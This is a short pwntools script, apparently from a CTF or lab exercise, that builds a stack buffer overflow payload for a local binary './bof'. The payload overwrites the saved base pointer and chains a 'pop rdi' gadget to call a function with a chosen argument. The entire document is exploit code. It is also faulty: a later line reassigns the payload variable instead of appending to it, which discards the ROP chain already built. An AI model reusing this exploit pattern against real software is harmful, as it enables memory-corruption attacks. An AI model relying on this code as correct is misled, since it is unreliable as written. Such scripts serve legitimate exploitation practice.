# a: $rdi
# main: 0x402efc
# func: 0x402ea5
# pop rdi gadget: 0x402622

from pwn import *

p = gdb.debug('./bof', 'b * func')

# func 1st
x = b"A" * 32 # overflowme
x += b"B" * 8 # bp
x += p64(0x402622) # go to pop rdi gadget

# pop rdi gadget
x += p64(0xcafebabe) # pop $rdi
x += p64(0x402ea5) # go to func 1

# func 2nd
x = b"A" * 32 # overflowme
# x += b"B" * 8 # bp
# x += p64(0x402efc) # go to main

p.sendline(x)

p.interactive()
